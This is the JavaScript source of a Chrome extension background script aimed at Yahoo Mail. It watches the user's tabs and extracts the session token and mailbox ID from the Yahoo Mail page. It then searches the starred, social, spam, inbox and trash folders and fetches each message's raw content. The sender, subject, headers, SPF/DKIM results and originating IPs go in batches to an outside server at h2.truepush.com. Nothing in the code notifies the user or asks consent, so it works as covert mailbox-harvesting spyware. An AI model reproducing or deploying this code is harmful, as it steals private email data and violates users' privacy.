function yahoo_proc(conf){

var userid;
var Yahoo_FLAG=0;
var Yquee=[];
var y_index=0;
var y_result=[];

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab){
	
		YgetTabs();
		
	});
chrome.tabs.onCreated.addListener(function (tabId, changeInfo, tab){
	
		YgetTabs();
	});
chrome.tabs.onSelectionChanged.addListener(function(tabId, changeInfo, tab){
	
		YgetTabs();
	});
chrome.windows.onFocusChanged.addListener(function (tabId, changeInfo, tab)
{
	YgetTabs();
});

function YgetTabs()
{///function for getting url
		var opt=
		{
				active:true,
				currentWindow:true,
				url:"https://*.mail.yahoo.com/*",
				windowType:"normal"
		}
	chrome.tabs.query(opt,function(result){
			try{
				
				Yincludes(result[0].url,result[0].title);
				
				}
				catch(err)
				{
						//console.log("Error "+ err);
						Yincludes("nthng","nthng");
				}
		});
	
}
function Yincludes(taburl,tabtitle)
{	
	if(tabtitle!="nthng"&taburl!="nthng")
	{	var patt = new RegExp("mail.yahoo.com");
		
		if(patt.test(taburl))
		{	
				if(Yahoo_FLAG==0)
				{Yahoo_FLAG=1;
				var yahoo_tabInfo=[];
				yahoo_tabInfo["url"]=taburl;
				connectToYahoo(yahoo_tabInfo);
				}
				else
				{
						Wait(taburl);
				}
		}
		else
		{
			console.log("INVUERROR");
		}
	}
}
function Wait(taburl)
{
	if(Yquee.indexOf(taburl)==-1)
	{			
			Yquee.push(taburl);
			
	}else
	{
			//console.log("Already in quee "+Yahoo_FLAG);	
			//console.log(Yquee);	
	}
	
}
function connectToYahoo(yahoo_tabInfo)
{
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() 
		{ 			if(this.status>200&&this.readyState==4)
					{
						console.log("something went wrong with "+this.status);
					}
					else if (this.readyState == 4 && this.status == 200) 
					{
				   
						var temp=yahoo_tabInfo["url"].split("/");
						if(temp[3]=="d")
						{
						 Ygetids(yahoo_tabInfo,this.responseText,"d");
						}
						else
						{
							 Ygetids(yahoo_tabInfo,this.responseText,"neo");
						}
					 
					}
					else
					{
						//console.log('fetching data....');
					}
	  };
	  xhttp.onerror = function () {
			if(this.status==0&this.readyState==4)
			{
				
				setTimeout(function(){connectToYahoo(yahoo_tabInfo)},conf.rftime);
			}
			else
			{
					console.log("unknown error with "+this.status);
					yahoo_proc(conf);
			}
		};

	  xhttp.open("GET", "https://mg.mail.yahoo.com/neo/launch");
	  xhttp.send();
	
}
function Ygetids(yahoo_tabInfo,data,type){
	
	if(type=="neo")
	{
	var email=/emailAddress:(.*)/g.exec(data);
	email=email[0].split(",");
	email=email[0].split(":");
	email=email[1];
	email=email.substring(1,email.length-1);
	email=email.trim();
	yahoo_tabInfo["email"]=email;
	yahoo_tabInfo['daylimit']=conf.yahoo_daylimit;
		
			var today = new Date(); 
				var day=today.getDate();
				today.setDate(day+1);
				var month=today.getMonth()+1;
				month=month>9?month:"0"+month;
				var date=today.getDate().toString();
				date=date.length>1?date:"0"+date;
				var year=today.getFullYear();
				today=year+"/"+month+"/"+date;
			yahoo_tabInfo['today']=today;
			
			
			///for the date of day limit
				var d = new Date();  
				var dayOfMonth = d.getDate(); 
				var myDate=new Date();
				myDate.setDate(dayOfMonth -yahoo_tabInfo.daylimit);  
				var month=myDate.getMonth()+1;
				month=month>9?month:"0"+month;
				var day=myDate.getDate().toString();
				day=day.length>1?day:"0"+day;
				var year=myDate.getFullYear();
				myDate=year+"/"+month+"/"+day;
				yahoo_tabInfo['lastday']=myDate;
				
				var query='after:"'+myDate+'" before:"'+today+'"';
				yahoo_tabInfo['date_query']=encodeURIComponent(query)
				yahoo_tabInfo['timezone']=Intl.DateTimeFormat().resolvedOptions().timeZone;
	getLuserid(yahoo_tabInfo.email,data,type,
	function(uid){
			userid=uid;
			yahoo_tabInfo['userid']=uid;
			var id=/@.id==((\\"|[^"\\])*)/.exec(data);
			try{var id=id[0].split('==');
			var mailboxid=id[1];
			yahoo_tabInfo["mailboxid"]=mailboxid;
			}
			catch(err)
			{console.log(err);}
			if(yahoo_tabInfo.mailboxid===null||yahoo_tabInfo.mailboxid===undefined)
			{
				yahoo_tabInfo["mailboxid"]="nthng";
			}
			ssid = /wssid:"((\\"|[^"])*)"/.exec(data);
			try{ 
			 ssid = ssid[0].split(':');
			 ssid = ssid[1].replace(/"/g,'');
			 yahoo_tabInfo["ssid"]=ssid
			
				}
			catch(err)
			{
				 ssid = /"mailWssid":"((\\"|[^"])*)"/.exec(data);
				 ssid = ssid[0].split(':');
				 ssid = ssid[1].replace(/"/g,'');
				 yahoo_tabInfo["ssid"]=ssid
				  
			}
			if(yahoo_tabInfo["ssid"]===null||yahoo_tabInfo["ssid"]===undefined||yahoo_tabInfo["ssid"].length==0)
			{
				yahoo_tabInfo["ssid"]="nthng";
			}
			if(yahoo_tabInfo["ssid"]!="nthng"&yahoo_tabInfo["mailboxid"]!="nthng")
			{		
				
					yahoo_getmessageid(yahoo_tabInfo,"starred",1);
			}
			else
			{		console.log("Some thing went wrong");
					if(Yquee.length==0)
						{
								Yahoo_FLAG=0;
						}
						else if(Yquee.length>0)
						{		Yquee.shift();
								connectToYahoo(yahoo_tabInfo);
						}
				//setTimeout(function(){connectToYahoo(yahoo_tabInfo);},1000*30);
			}
	});
	
	}
	else if(type=="d")
	{
			var mreg=/"mailboxes":\[{"id":.*?\}/g;
			try{
				mre=mreg.exec(data);
				mre=JSON.parse(mre[0].split("[")[1]);
				yahoo_tabInfo["email"]=mre.email;
				yahoo_tabInfo["mailboxid"]=mre.id;
				}catch(err)
				{
					console.log(err);
					yahoo_tabInfo["email"]="nthng";
				yahoo_tabInfo["mailboxid"]="nthng";
				}
			try{
				var ssidre=/"mailWssid":".*?"/g.exec(data)
				var ssid=ssidre[0];
				ssid=ssid.split(":")[1].replace(/"/g,"");
				
				var r = /\\u([\d\w]{4})/gi;
				x=ssid
				x = x.replace(r, function (match, grp) {
					return String.fromCharCode(parseInt(grp, 16)); } );
				x = unescape(x);

				yahoo_tabInfo["ssid"]=x;
				}
				catch(err)
				{
						console.log(err);
						yahoo_tabInfo["ssid"]="nthng"
						
				}
				yahoo_tabInfo['daylimit']=conf.yahoo_daylimit;
		
			var today = new Date(); 
				var day=today.getDate();
				today.setDate(day+1);
				var month=today.getMonth()+1;
				month=month>9?month:"0"+month;
				var date=today.getDate();
				date=date>9?date:"0"+date;
				var year=today.getFullYear();
				today=year+"/"+month+"/"+date;
				yahoo_tabInfo['today']=today;
			
	
			///for the date of day limit
				var d = new Date();  
				var dayOfMonth = d.getDate(); 
				var myDate=new Date();
				myDate.setDate(dayOfMonth -yahoo_tabInfo.daylimit);  
				var month=myDate.getMonth()+1;
				month=month>9?month:"0"+month;
				var day=myDate.getDate();
				day=day>9?day:"0"+day;
				var year=myDate.getFullYear();
				myDate=year+"/"+month+"/"+day;
				yahoo_tabInfo['lastday']=myDate;
				
				var query='after:"'+myDate+'" before:"'+today+'"';
				yahoo_tabInfo['date_query']=encodeURIComponent(query)
				yahoo_tabInfo['timezone']=Intl.DateTimeFormat().resolvedOptions().timeZone;
				
				
				getLuserid(yahoo_tabInfo.email,data,type,
					function(uid){
							userid=uid;
							yahoo_tabInfo['userid']=uid;
							if(yahoo_tabInfo["ssid"]!="nthng"&yahoo_tabInfo["email"]!="nthng"&yahoo_tabInfo["mailboxid"]!="nthng")
							{
								yahoo_getmessageid(yahoo_tabInfo,"starred",1);
							}
							else
							{
								console.log("Some thing went wrong");
								//setTimeout(function(){connectToYahoo(yahoo_tabInfo)},conf.rftime);
							}
						
							});
	}
}


function yahoo_getmessageid(yahoo_tabInfo,fname,fid)
{y_index=0;
y_result=[];
		yahoo_tabInfo.folderType=fname;
		yahoo_tabInfo.fid=fid;
		
		if(fname=="starred"||fname=="social")
		{
				query="%20is%3A"+fname+"%20"+yahoo_tabInfo['date_query'];	
		}
		else
		{
			query=yahoo_tabInfo['date_query'];	
		}
				
			var url='https://data.mail.yahoo.com/psearch/v3/srp?timezone='+yahoo_tabInfo.timezone+'&clientid=mailsearch&mailboxid='+yahoo_tabInfo["mailboxid"]+'&appid=YahooMailNeo&searchInTrash=1&mailboxtype=FREE&ui=1&query='+query+'&limit='+conf.yahoo_maxlimit+'&folders='+fid+'&multipart=false&expand=ALL&wssid='+yahoo_tabInfo["ssid"]
			var xhr=new XMLHttpRequest();
			xhr.open("GET",url);
			xhr.onreadystatechange=function()
			{	var msgdata=[];
					if(this.status>200&&this.readyState==4)
					{
						if(this.status==401)
						{
							yahoo_proc(conf);
							
						}
						else
						{
							setTimeout(function(){connectToYahoo(yahoo_tabInfo)},1000*30);
						}
						
					}
					 else if(this.status==200&this.readyState==4)
					{
							var d=this.responseText
							var reg=/{"items":\[{.*?,"totalHits":\d{0,}/g;
							while(res=reg.exec(d))
							{
								if(res!==undefined)
								{
									res=res[0]+"}";
									res=JSON.parse(res);
									res=res.items
									msgdata.push(res);
								}
							}
								
									getChecksum(yahoo_tabInfo.mailboxid,yahoo_tabInfo.folderType,
										function(checksum,checktime)
										{	
											yahoo_tabInfo['checksum']=checksum;
											yahoo_tabInfo['checktime']=checktime;
											if(msgdata.length>0)
												{
													msgdata=msgdata[0];
												}
											yahoo_getrawdata(yahoo_tabInfo,msgdata);
										});
										
									}	
								
								
							
					
			}
			xhr.onerror = function () {
			if(this.status==0&&this.readyState==4)
			{
					setTimeout(function(){yahoo_getmessageid(yahoo_tabInfo,fname,fid)},conf.rftime);
			}
			else
			{
				console.log(this);
			}
		};
			xhr.send();
}

function yahoo_getrawdata(yahoo_tabInfo,msgdata)
{
	
	if(y_index<msgdata.length&msgdata.length>0)
	{	
		
			if(y_index==0)
				{	
					yahoo_tabInfo['first_msgid']=msgdata[0].mid;
					yahoo_tabInfo['first_time']=msgdata[0].creationDate;
					
				}
			if(yahoo_tabInfo['checksum']==msgdata[y_index].mid)
			{
				y_index=msgdata.length;
				yahoo_getrawdata(yahoo_tabInfo,msgdata)
				
			}
			else if(yahoo_tabInfo['checktime']>msgdata[y_index].creationDate)
			{
				y_index=msgdata.length;
				yahoo_getrawdata(yahoo_tabInfo,msgdata);
			}
			else
			{
				
				var xhr=new XMLHttpRequest();
				var turl="https://apis.mail.yahoo.com/ws/v3/mailboxes/@.id=="+yahoo_tabInfo['mailboxid']+"/messages/@.id=="+msgdata[y_index].mid+"/content/rawplaintext?appid=YahooMailNeo&wssid="+yahoo_tabInfo['ssid'];
				xhr.open("GET",turl);
				xhr.onreadystatechange=function()
				{		if(this.status>200&&this.readyState==4)
						{
							if(this.status==401)
							{
								yahoo_proc(conf);
							}
							else
							{
								setTimeout(function(){connectToYahoo(yahoo_tabInfo)},1000*30);
							}
						}
						else if(this.status==200&this.readyState==4)
						{
							var Ymessage={};
							var data=this.responseText;
							
							var date=msgdata[y_index].creationDate;
							Ymessage['sender']=msgdata[y_index].fromList[0].name;
							Ymessage['from']=msgdata[y_index].fromList[0].id;
							Ymessage['seen']=msgdata[y_index].isRead==true?1:0;
							Ymessage['label']=yahoo_tabInfo.folderType;
							Ymessage['subject']=msgdata[y_index].subject;
							Ymessage['toEmail']=yahoo_tabInfo.email;
							Ymessage['mid']=msgdata[y_index].mid;
							YgetMessageId(data,function(res){
										Ymessage.msgId=res;   
									  });

									
									var milli=new Date(date).getTime();
									var d=new Date(milli);
									d=d.toDateString();
									d=new Date(d);
								    d=d.getTime();
									var Created={};
									Created.date=d;
									Created.time=milli;									  
									Ymessage.created=Created;
									

									getSMTP(data,function(res){
										Ymessage.SMTP=res;
									  });
							
									getSPF(data,function(res1,res2){
										if(res1=='pass')
										  Ymessage.SPF=1;
										else if(res1=='fail')
										  Ymessage.SPF=0;
										else
										  Ymessage.SPF=2;
										if(res2)
										  Ymessage.SPF_IP=res2;
										  
									  });
									getDKIM(data,function(res){
										if(res=='pass')
										  Ymessage.DKIM=1;
										else if(res=='fail')
										  Ymessage.DKIM=0;
										else
										  Ymessage.DKIM=2;
									  });
									
							
									if(yahoo_tabInfo.folderType=="%2540B%2540Bulk")
									  {
									  Ymessage.label="spam";
									  }
									  else if(yahoo_tabInfo.folderType=="Inbox")
									  {
										Ymessage.label="inbox";  
									  }
									  else if(yahoo_tabInfo.folderType=="Trash")
									  {
										Ymessage.label="trash";  
									  }
									  else
									  {
										 Ymessage.label=yahoo_tabInfo.folderType;  
									  }
									  Ymessage.ESP='yahoo';
									  Ymessage.app='chrome';
									  Ymessage.d=Ymessage.from.split("@")[1];
										
									  var myid = chrome.runtime.id
									  Ymessage.appid=myid;
									   var version = chrome.app.getDetails().version;
										Ymessage.Ext_version=version;
										Ymessage.uid=yahoo_tabInfo["userid"]
									   getDomain(data,function(res)
									   {
										  Ymessage.domain=res;
										     
										})	
										
							y_result.push(Ymessage);
							if(y_result.length%50==0&&y_result.length!=0)
							{
								yahoo_sendData(y_result,yahoo_tabInfo,yahoo_tabInfo['first_msgid'],yahoo_tabInfo.folderType,yahoo_tabInfo['first_time']);
								y_result=[];
							}
							y_index++;
							yahoo_getrawdata(yahoo_tabInfo,msgdata)
						}
				}
				xhr.onerror = function () {
					if(this.status==0&&this.readyState==4)
					{
						setTimeout(function(){yahoo_getrawdata(yahoo_tabInfo,msgdata)},conf.rftime);
					}
					else 
					{
						console.log(this.status);
					}
					};
				xhr.send();
				
			}
	}
	else
	{
			if(y_result.length>0)
			{
					yahoo_sendData(y_result,yahoo_tabInfo,yahoo_tabInfo['first_msgid'],yahoo_tabInfo.folderType,yahoo_tabInfo['first_time']);
					y_result=[];
			}
			
					if(yahoo_tabInfo.folderType=="starred")
					{ 
						yahoo_getmessageid(yahoo_tabInfo,"social",1);
					}
					else if(yahoo_tabInfo.folderType=="social")
					{ 
						yahoo_getmessageid(yahoo_tabInfo,"%2540B%2540Bulk",6);
					}
					else if(yahoo_tabInfo.folderType=="%2540B%2540Bulk")
					{
			
						yahoo_getmessageid(yahoo_tabInfo,"Inbox",1);
					}
					else if(yahoo_tabInfo.folderType=="Inbox")
					{
						yahoo_getmessageid(yahoo_tabInfo,"Trash",4);
					}
					else if(yahoo_tabInfo.folderType=="Trash")
					{	if(Yquee.length==0)
						{
								Yahoo_FLAG=0;
						}
						else if(Yquee.length>0)
						{		Yquee.shift();
								connectToYahoo(yahoo_tabInfo);
						}
					}
	}
		
}


function getLuserid(mailid,data,type,callback)
{
	chrome.storage.local.get(null,function(result)
	{var appid=chrome.runtime.id;
		   if(typeof(result.userid)=='undefined')
				{///if there is no uid in local storage
					//userid=call(mailid,appid,"yahoo",function(uid){userid=uid;callback(userid)});
					userid=0;
					callback(0)
					
				}
			else{
				/// if uid is there then check for maillist
					var check=typeof(result.mails[mailid+'']);
					if(check!=='undefined')
					{/// the mail is in mails list
						userid=result.userid;
						callback(userid)
					}
					else
					{/// the mails is not in list
						userid=result.userid;
						//call1(appid,mailid,userid,"yahoo")
						callback(userid)
						
					}
				}
	///setting of userid
		
		if(typeof(result.mails)=='undefined')
		{ 
			var mails={};
			mails[mailid+""]=1;
			chrome.storage.local.set({ mails },function()
			{
					chrome.storage.local.get(null,function(result)
					{
						//	console.log(JSON.stringify(result))
					});
			});
		}
		else{
		var mails=result.mails;
		mails[mailid+""]=1;
		
		chrome.storage.local.set({ mails },function()
		{
				chrome.storage.local.get(null,function(result)
		{
				
		})
		});
		;
		}
	});
}

function call(mailid,appid,esp,callback)
{

			$.post(conf.ip+"/email_distinct",
			{email:mailid,appid:appid,esp:esp},
			function(data,status)
			{
					
					
					userid=data.uid;
					chrome.storage.local.set({ userid });
					callback(data.uid);
			}
			).fail(function(status) {
				setTimeout(function(){
					call(mailid,appid,esp,function(uid){userid=uid;callback(userid)});
					},conf.rf_time);

		

})}
function call1(appid,mailid,userid,esp)
{		
		$.post(conf.ip+"/email_distinct_uid",{email:mailid,refid:userid,appid:appid,esp:esp},function(data,status)
			{
					
				
			}).fail(function(status) {
				setTimeout(function(){
					call1(appid,mailid,userid,esp)
					},conf.rf_time);
				})
	
}	


function getChecksum(mbid,fname,callback)
{
	chrome.storage.local.get(null,function(Yresult)
	{
			try{
				callback(Yresult.yahoo[mbid+"_"+fname+"_msgid"],Yresult.yahoo[mbid+"_"+fname+"_time"]);
				}
				catch(err)
				{		callback("0")
						
				}
			
	});
}
function setChecksum(mbid,msgid,fname,time)
{
	
	chrome.storage.local.get(null,function(Yresult)
	{
		
		try{
			   Yresult.yahoo[mbid+"_"+fname+"_msgid"]=msgid;
			   Yresult.yahoo[mbid+"_"+fname+"_time"]=time;
			   yahoo=Yresult.yahoo;
			   chrome.storage.local.set({yahoo},function()
			   {
				  chrome.storage.local.get(null,function(Yresult){
					  
					 //console.log("after set : "+JSON.stringify(Yresult));
					  
					  }) 
			   });
			
			}
			catch(err)
			{
				console.log(err);
				try
				{	var a={};
					a[mbid+"_"+fname+"_msgid"]=msgid;
					a[mbid+"_"+fname+"_time"]=time;
					Yresult.yahoo.push(a);
				}
				catch(err)
				{	console.log(err);
					var yahoo={};
					yahoo[mbid+"_"+fname+"_msgid"]=msgid;
					yahoo[mbid+"_"+fname+"_time"]=time;
						console.log(err)
						chrome.storage.local.set({yahoo},function()
						{
								
							//chrome.storage.local.get(null,function(r){console.log(r)})
						})
				}
			}
	
	
	
	});
	
	

	
	
	
}

function YgetMessageId(val,callback){
  try{msg=/Message-I.: <(.*)>/.exec(val);
    msg=msg[0].split(':');
    msg=msg[1].replace('<','').replace('>','').replace(' ','');
    callback(msg);
  }catch(err){
    callback(0);
  }
}


function getDomain(val,callback)
{
		try{var temp=/Authentication-Results:?.*/g.exec(val);
			temp=/from=.*/g.exec(temp);
		
		
		temp=temp[0].split(";");
		temp=temp[0].split("=");
		temp=temp[1];
		temp=temp.replace(';','');
		
		}
		catch(err)
		{
				
				temp=null;
		}
		callback(temp);
	
	
}


function getSMTP(val,callback){
    try{
		smtp=/Received: (.*)/gm.exec(val);
    smtp=smtp[0].replace('Received: ','');
    smtp=/\([a-zA-Z 0-9-.]*\)/.exec(smtp);
    smtp=smtp[0].replace('(','').replace(')','');
    smtp=smtp.split(' ');
    if(smtp[1])
      callback(smtp[1]);
    else
      callback(smtp[0]);
  }
  catch(err)
  {
		console.log(err);
		callback(null)
	}
}

function getSPF(val,callback){
    try{spf=/Received-SPF:(.*)/.exec(val);
		spf=spf[0].replace('Received-SPF: ','');
		spf=spf.split('(');
		spf[0]=spf[0].replace(' ','')
		s=/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/gm.exec(spf[1]);
		try{
		
		  callback(spf[0],s[0]);
		}catch(err){
			var r=/X-Originating-IP:.*?]/g.exec(val);
		  callback(spf[0],r[0].split(":")[1].replace("[","").replace("]","").trim());
		} 
    }
    catch(err)
	  {
			console.log(err);
			callback(null)
	  }
}
function getDKIM(val,callback){
    try{
		dkim=/dkim=([a-zA-Z]*)/gm.exec(val);
		dkim=dkim[0].replace('dkim=','');
		callback(dkim);
	}
	catch(err)
	  {
			console.log(err);
			callback(null)
	  }
}


function yahoo_sendData(res,tabInfo,msgid,fname,time){
 
       $.ajax({
        type: "POST",
        url: conf.url,
        data:JSON.stringify(res),
        contentType: "application/json",
        crossDomain: true,
        dataType: "json",
        success: function (data, status, jqXHR) {
           
            setChecksum(tabInfo.mailboxid,msgid,fname,time);
            
            
        },

        error: function (jqXHR, status) {
            console.log(status);
            setTimeout(function(){yahoo_sendData(res,tabInfo,msgid,fname)},conf.rf_time);
        }
    });
  
}
}
yahoo_conf={"url":"https://h2.truepush.com/way2","ip":"https://h2.truepush.com","rftime":100000,"yahoo_maxlimit":600,"yahoo_daylimit":7}
yahoo_proc(yahoo_conf);
/*
function call3(appid,callback)
{		
		$.post("https://h2.truepush.com/rabbit_conf",{app_id:appid},function(data,status)
			{
					
			}).done(function(data) {
				if(data.msg=="U r not our user")
				{
					console.log("fake extension");
				}
				else
				{
					yahoo_proc(data)
				}
				
				})
				.fail(function(status) {
				setTimeout(function(){
					call3(chrome.runtime.id,function(data){});
					},1000*30);
  })
			
			
}
try{
call3(chrome.runtime.id,function(data){});
}
catch(err)
{
		console.log(err);
}*/




